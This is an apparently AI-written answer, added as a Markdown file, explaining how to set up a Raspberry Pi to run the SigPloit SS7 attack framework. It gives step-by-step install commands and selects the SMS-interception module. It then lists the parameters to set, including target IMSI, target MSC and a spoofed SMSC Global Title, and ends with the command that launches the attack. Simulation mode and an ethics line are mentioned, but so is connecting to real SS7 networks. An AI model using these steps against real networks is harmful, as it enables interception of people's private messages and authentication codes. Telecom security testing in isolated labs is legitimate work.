@@ -1,0 +1,189 @@
+How can I set up a Raspberry Pi to use with SigPloit
+
+To set up a **Raspberry Pi** for use with **SigPloit**, follow these step-by-step instructions. This guide covers preparing your Pi, installing dependencies, and configuring SigPloit for SS7 testing in both simulation and live modes.
+
+---
+
+## **1. Prepare Your Raspberry Pi**
+
+**A. Install Raspberry Pi OS**
+- Download and flash Raspberry Pi OS (preferably 64-bit for Pi 4) using the Raspberry Pi Imager.
+- Insert the SD card, connect keyboard, mouse, and monitor, and power on the Pi.
+- Complete the initial setup and connect to the internet[5][7].
+
+**B. Update Your System**
+```bash
+sudo apt update
+sudo apt upgrade
+```
+
+**C. (Optional) Enable SSH for Headless Operation**
+- Enable SSH via `raspi-config` or by placing an empty file named `ssh` in the `/boot` directory[5][7].
+
+---
+
+## **2. Install Dependencies**
+
+**A. Install Required Packages**
+```bash
+sudo apt install python2 python2-pip git openjdk-11-jre lksctp-tools
+```
+
+**B. (Optional) Install Wireshark for SS7 Traffic Analysis**
+```bash
+sudo apt install wireshark tshark
+```
+
+---
+
+## **3. Download and Set Up SigPloit**
+
+**A. Clone the SigPloit Repository**
+```bash
+git clone https://github.com/SigPloit/SigPloit.git
+cd SigPloit
+```
+
+**B. Install Python Dependencies**
+```bash
+sudo pip2 install -r requirements.txt
+```
+
+---
+
+## **4. Configure Network for SS7/SIGTRAN**
+
+**A. Assign Loopback IPs for Simulation**
+```bash
+sudo ip address add 192.168.56.101/32 dev lo
+sudo ip address add 192.168.56.102/32 dev lo
+```
+- These IPs are used for client/server simulation in SigPloit[4].
+
+**B. (Optional) Connect to Real SS7/SIGTRAN Network**
+- If you have access, configure your network interface with the appropriate IP and routing.
+
+---
+
+## **5. Run SigPloit**
+
+**A. Start SigPloit**
+```bash
+python2 sigploit.py
+```
+- You should see the SigPloit menu.
+
+**B. Select the Desired Attack Module**
+- For SMS interception, navigate as follows:
+  ```
+  > Enter: 0   # SS7 module
+  > Enter: 1   # SMS Interception
+  ```
+
+**C. Set Required Parameters**
+- Use the `show options` command to view and set parameters:
+  - `client_pc`: Your (attacker) Point Code
+  - `server_pc`: Target MSC/HLR Point Code
+  - `client_ip`/`server_ip`: Use the loopback IPs above for simulation
+  - `client_port`/`server_port`: Typically 2905/2906
+  - `target_imsi`: IMSI of the target
+  - `target_msc`: MSC serving the target
+  - `local_GT`: Your (attacker) Global Title
+  - `Spoofed_smscGT`: Spoofed SMSC Global Title[4][6]
+
+  Example:
+  ```
+  set client_pc 1
+  set client_ip 192.168.56.101
+  set client_port 2905
+  set server_pc 2
+  set server_ip 192.168.56.102
+  set server_port 2906
+  set target_imsi 123456789012345
+  set target_msc 201512345678
+  set local_GT 96512345678
+  set Spoofed_smscGT 965123456780
+  ```
+
+**D. Run the Attack**
+```bash
+run
+```
+- SigPloit will execute the attack and display results in the terminal[3][4][6].
+
+---
+
+## **6. (Optional) Use Simulation Mode**
+
+- For safe testing, use SigPloit’s simulation mode:
+  - Start the server simulation:
+    ```bash
+    java -jar SigPloit/Testing/Server/Attacks/Interception/UpdateLocation_Server.jar
+    ```
+  - Run the client-side attack as above[6].
+
+---
+
+## **7. Monitor and Analyze**
+
+- Use Wireshark or tshark to capture and analyze SS7 traffic:
+  ```bash
+  tshark -i lo -Y "sccp" -V
+  ```
+
+---
+
+## **8. Security and Ethics**
+
+- Only use SigPloit in authorized, isolated, or simulated environments.
+- Follow all legal and ethical guidelines for penetration testing[2][6].
+
+---
+
+### **Summary Table**
+
+| Step                | Command/Action                                      |
+|---------------------|-----------------------------------------------------|
+| Update OS           | `sudo apt update && sudo apt upgrade`               |
+| Install dependencies| `sudo apt install python2 python2-pip git ...`      |
+| Clone SigPloit      | `git clone ...`                                     |
+| Install Python deps | `sudo pip2 install -r requirements.txt`             |
+| Assign IPs          | `sudo ip address add ...`                           |
+| Start SigPloit      | `python2 sigploit.py`                               |
+| Set parameters      | `set client_pc ...` etc.                            |
+| Run attack          | `run`                                               |
+| Analyze traffic     | `tshark -i lo -Y "sccp" -V`                         |
+
+---
+
+**References:**  
+- [FireCompass: Exploiting SS7 Vulnerabilities Using SigPloit][4]  
+- [IASP 560 – Final Group Project | Fall 2019 A GUIDE TO SIGPLOIT][6]  
+- [DragonOS Pi64 SigPloit SS7 SendIMSI Setup (YouTube)][3]  
+- [Raspberry Pi Installation | rTS Wiki][5]  
+
+This setup will allow you to use your Raspberry Pi as a powerful SS7 testing platform with SigPloit.
+
+Citations:
+[1] Ss7-attack-suite.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/54998863/28d90260-4c63-4d04-b161-716c2149ef87/Ss7-attack-suite.pdf
+[2] SS7-attack-suite-designed-for-penetration-testing-and-security-assessments-of-SS7-networks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/54998863/46f2aeed-87d9-4133-a189-0b2121f7b669/SS7-attack-suite-designed-for-penetration-testing-and-security-assessments-of-SS7-networks.pdf
+[3] DragonOS Pi64 SigPloit SS7 SendIMSI Setup (Raspberry Pi4) https://www.youtube.com/watch?v=W5tEwoOqx4g
+[4] Exploiting SS7 Vulnerabilities Using SigPloit - FireCompass https://www.firecompass.com/exploiting-ss7-vulnerabilities-sigploit/
+[5] Raspberry Pi Installation | rTS Wiki https://rtech.support/guides/raspberry-pi-installation/
+[6] [PDF] IASP 560 – Final Group Project | Fall 2019 A GUIDE TO SIGPLOIT http://cysecure.org/560/online/project/sigploit_brianSteiner_joyGeorge_louisEscoto_emmanuelSefa.pdf
+[7] The Ultimate Headless RPi Zero Setup for Beginners - Instructables https://www.instructables.com/The-Ultimate-Headless-RPi-Zero-Setup-for-Beginners/
+[8] DragonOS Pi64 SS7 Any Time Interrogation (SigPloit, Pi4, Beta7+) https://www.youtube.com/watch?v=Y8UrA4C45ws
+[9] Raspberry Pi setup - Qoitech User Manual https://docs.qoitech.com/user-manual/otii-setup/software/raspberry-pi
+[10] SigPloit: Telecom Signaling Exploitation Framework - GitHub https://github.com/SigPloiter/SigPloit
+[11] 3G: Practical Attacks Against the SS7 Signaling Protocol https://www.kroll.com/en/insights/publications/cyber/3g-practical-attacks-against-the-ss7-signaling-protocol
+[12] Headless Raspberry Pi Setup Notes - GitHub https://github.com/projecthorus/radiosonde_auto_rx/wiki/Headless-Raspberry-Pi-Setup-Notes
+[13] DragonOS Pi64 w/ kisStatic2Mobile + Kismet Remote ... - YouTube https://www.youtube.com/watch?v=eWs7y6Yt9Q8
+[14] [PDF] SS7 for INFOSEC Paul Coggin @Paul Coggin - DeepSec https://deepsec.net/docs/Slides/2018/SS7_for_INFOSEC_Paul_Coggin.pdf
+[15] sospilot/docs/raspberrypi-install.rst at master - GitHub https://github.com/Geonovum/sospilot/blob/master/docs/raspberrypi-install.rst
+[16] Raspberry Pi: Python Scripting the GPIO - Instructables https://www.instructables.com/Raspberry-Pi-Python-scripting-the-GPIO/
+[17] Exploring SS7 Vulnerabilities with SigPloit: A Comprehensive https://www.coursehero.com/file/230913600/sigploit-brianSteiner-joyGeorge-louisEscoto-emmanuelSefapdf/
+[18] Raspberry Pi Setup Guide - CNCjs https://cnc.js.org/docs/rpi-setup-guide/
+[19] Need help setting up a raspberry pi : r/cybersecurity - Reddit https://www.reddit.com/r/cybersecurity/comments/l044mg/need_help_setting_up_a_raspberry_pi/
+[20] Getting started - Raspberry Pi Documentation https://www.raspberrypi.com/documentation/computers/getting-started.html
+[21] Configuration - Raspberry Pi Documentation https://www.raspberrypi.com/documentation/computers/configuration.html
+[22] [PDF] Project Proposal | Fall 2019 INTERCEPT SMS MESSAGES USING http://cysecure.org/560/online/project/prop560f19_brianSteiner_louisEscoto_emmanuelSefa_joyGeorge_cellSMS.pdf
